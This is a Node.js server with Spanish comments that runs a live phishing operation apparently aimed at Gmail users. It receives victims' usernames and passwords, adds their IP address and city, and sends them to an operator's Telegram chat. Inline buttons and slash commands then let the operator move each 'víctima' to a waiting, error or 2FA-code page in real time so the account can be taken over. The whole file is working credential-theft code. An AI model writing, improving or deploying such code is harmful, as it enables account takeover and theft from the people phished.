const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const fs = require('fs');
require('dotenv').config();
const https = require('https');

// 👉 FORZAR IPv4
const agent = new https.Agent({ family: 4 });

const app = express();

app.use(cors({
  origin: '*',
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type']
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const STATUS_FILE = './status.json';

let clientes = {};
if (fs.existsSync(STATUS_FILE)) {
  clientes = JSON.parse(fs.readFileSync(STATUS_FILE));
}

function guardarEstado() {
  fs.writeFileSync(STATUS_FILE, JSON.stringify(clientes, null, 2));
}

// 👉 Obtener ciudad con IPv4 forzado
async function obtenerCiudad(ip) {
  try {
    const response = await fetch(`https://ipinfo.io/${ip}/json`, { agent });
    const data = await response.json();
    return data.city || 'Ciudad desconocida';
  } catch {
    return 'Ciudad desconocida';
  }
}

// -----------------------------------------------------------
//  /enviar
// -----------------------------------------------------------
app.post('/enviar', async (req, res) => {
  const { usar, clav, txid } = req.body;

  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
  const ciudad = await obtenerCiudad(ip);

  const mensaje = `
❤️GM4YL❤️
🆔 ID: <code>${txid}</code>

📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clav}</code>

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔑CONFIRMAR", callback_data: `cel-dina:${txid}` }],
      [{ text: "🔄CARGANDO", callback_data: `verifidata:${txid}` }],
      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
    ]
  };

  clientes[txid] = { status: "esperando" }; // Cambiamos a objeto para poder agregar code después
  guardarEstado();

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    }),
    agent
  });

  res.sendStatus(200);
});

// -----------------------------------------------------------
//  /callback (maneja botones inline) + NUEVO: comandos de texto (/txid 22)
// -----------------------------------------------------------
app.post('/callback', async (req, res) => {
  // 1. Manejo de callback de botones inline
  if (req.body.callback_query) {
    const callback = req.body.callback_query;
    if (!callback || !callback.data) return res.sendStatus(400);

    const [accion, txid] = callback.data.split(":");
    clientes[txid] = { status: accion };
    guardarEstado();

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callback.id,
        text: `Has seleccionado: ${accion}`
      }),
      agent
    });

    return res.sendStatus(200);
  }

  // 2. NUEVO: Manejo de comandos de texto como /abc123xyz 22
  if (req.body.message?.text) {
    const text = req.body.message.text.trim();

    if (text.startsWith('/')) {
      const parts = text.slice(1).split(' ');
      const txid = parts[0];
      const code = parts[1];

      if (txid && code && /^\d{2}$/.test(code)) {
        if (txid && parts[1] && parts[1].toLowerCase() === 'reset') {
  if (!clientes[txid]) {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: req.body.message.chat.id,
        text: `❌ txid ${txid} no encontrado`
      }),
      agent
    });
    return res.sendStatus(200);
  }

  clientes[txid] = { status: "esperando" };
  guardarEstado();

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: req.body.message.chat.id,
      text: `🔄 Reiniciado!\n\n🆔 ID: ${txid}\n\nLa víctima regresará a la página de espera.`
    }),
    agent
  });

  return res.sendStatus(200);
}
        
        if (!clientes[txid]) {
          await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: req.body.message.chat.id,
              text: `❌ Error: txid ${txid} no encontrado`
            }),
            agent
          });
          return res.sendStatus(200);
        }

        // Guardamos el código y cambiamos status
        clientes[txid] = {
          status: "codigo2fa",
          code: code
        };
        guardarEstado();

        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: req.body.message.chat.id,
            text: `✅ Código 2FA activado!\n\n🆔 ID: ${txid}\n🔢 Código: ${code}\n\nLa víctima será redirigida a la página del código en segundos.`
          }),
          agent
        });

        return res.sendStatus(200);
      }

      // Formato incorrecto
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: req.body.message.chat.id,
          text: `⚠️ Formato incorrecto.\n\nUsa: /txid código\nEjemplo: /abc123xyz 47`
        }),
        agent
      });

      return res.sendStatus(200);
    }
  }

  res.sendStatus(200);
});

// -----------------------------------------------------------
//  POLLING: devuelve status y code si existe
// -----------------------------------------------------------
app.get('/sendStatus.php', (req, res) => {
  const txid = req.query.txid;
  const cliente = clientes[txid] || { status: "esperando" };

  const response = {
    status: typeof cliente === 'string' ? cliente : (cliente.status || "esperando")
  };

  if (typeof cliente === 'object' && cliente.code) {
    response.code = cliente.code;
  }

  res.json(response);
});

app.get('/', (req, res) => res.send("Servidor activo en Render"));

app.listen(3000, () => console.log("Servidor activo en Render puerto 3000"));
